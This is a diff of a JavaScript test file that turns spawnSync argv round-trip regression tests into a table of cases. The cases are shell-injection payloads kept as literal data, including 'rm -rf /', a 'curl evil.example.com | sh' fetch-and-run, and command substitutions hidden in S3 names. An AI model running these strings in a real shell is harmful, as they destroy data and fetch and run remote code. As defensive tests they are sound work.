@@ -50,49 +50,70 @@ function roundtrip(payload) {
   return JSON.parse(result.stdout);
 }
 
+// Each entry is one regression case. Adding a new metacharacter or
+// payload shape that must round-trip means appending one row here, not
+// duplicating a four-line `it()` block.
+const LITERAL_PRESERVATION_CASES = [
+  {
+    label: "$() command substitution",
+    payload: ["--filter-pattern", "$(rm -rf /)"],
+  },
+  {
+    label: "backtick command substitution",
+    payload: ["--filter-pattern", "`id`"],
+  },
+  {
+    label: "single quotes",
+    payload: ["--parameters", "'; rm -rf /; echo '"],
+  },
+  {
+    label: "double quotes",
+    payload: ["--filter-pattern", '"; whoami; echo "'],
+  },
+  {
+    label: "semicolons",
+    payload: ["--filter-pattern", "foo; rm -rf /"],
+  },
+  {
+    label: "ampersands and pipes",
+    payload: ["--filter-pattern", "foo && curl evil.example.com | sh"],
+  },
+  {
+    label: "spaces inside a single argv element",
+    payload: ["--key", "this is one element"],
+  },
+  {
+    label: "newlines inside an argv element",
+    payload: ["--filter-pattern", "line one\nline two"],
+  },
+  {
+    label: "S3 keys containing shell metacharacters",
+    payload: [
+      "s3api",
+      "head-object",
+      "--bucket",
+      "evil$(id)bucket",
+      "--key",
+      "path/to/`whoami`/file.txt",
+    ],
+  },
+  {
+    label: "CloudWatch filter patterns containing every metacharacter",
+    payload: [
+      "logs",
+      "filter-log-events",
+      "--filter-pattern",
+      "$()`'\";|&\nsh -c 'whoami'",
+    ],
+  },
+];
+
 describe("spawnSync argv round-trip (issue #763)", () => {
-  it("preserves $() command substitution literally", () => {
-    const payload = ["--filter-pattern", "$(rm -rf /)"];
-    assert.deepEqual(roundtrip(payload), payload);
-  });
-
-  it("preserves backtick command substitution literally", () => {
-    const payload = ["--filter-pattern", "`id`"];
-    assert.deepEqual(roundtrip(payload), payload);
-  });
-
-  it("preserves single quotes literally", () => {
-    const payload = [
-      "--parameters",
-      "'; rm -rf /; echo '",
-    ];
-    assert.deepEqual(roundtrip(payload), payload);
-  });
-
-  it("preserves double quotes literally", () => {
-    const payload = ["--filter-pattern", '"; whoami; echo "'];
-    assert.deepEqual(roundtrip(payload), payload);
-  });
-
-  it("preserves semicolons literally", () => {
-    const payload = ["--filter-pattern", "foo; rm -rf /"];
-    assert.deepEqual(roundtrip(payload), payload);
-  });
-
-  it("preserves ampersands and pipes literally", () => {
-    const payload = ["--filter-pattern", "foo && curl evil.example.com | sh"];
-    assert.deepEqual(roundtrip(payload), payload);
-  });
-
-  it("preserves spaces inside a single argv element", () => {
-    const payload = ["--key", "this is one element"];
-    assert.deepEqual(roundtrip(payload), payload);
-  });
-
-  it("preserves newlines inside an argv element", () => {
-    const payload = ["--filter-pattern", "line one\nline two"];
-    assert.deepEqual(roundtrip(payload), payload);
-  });
+  for (const { label, payload } of LITERAL_PRESERVATION_CASES) {
+    it(`preserves ${label} literally`, () => {
+      assert.deepEqual(roundtrip(payload), payload);
+    });
+  }
 
   it("preserves the SSM --parameters JSON shape with embedded shell metacharacters", () => {
     const params = JSON.stringify({
@@ -114,27 +135,5 @@ describe("spawnSync argv round-trip (issue #763)", () => {
       result[result.length - 1].includes("$(whoami)"),
       "JSON-embedded $() must round-trip literally"
     );
-  });
-
-  it("preserves S3 keys containing shell metacharacters", () => {
-    const payload = [
-      "s3api",
-      "head-object",
-      "--bucket",
-      "evil$(id)bucket",
-      "--key",
-      "path/to/`whoami`/file.txt",
-    ];
-    assert.deepEqual(roundtrip(payload), payload);
-  });
-
-  it("preserves CloudWatch filter patterns containing all metacharacters at once", () => {
-    const payload = [
-      "logs",
-      "filter-log-events",
-      "--filter-pattern",
-      "$()`'\";|&\nsh -c 'whoami'",
-    ];
-    assert.deepEqual(roundtrip(payload), payload);
   });
 });
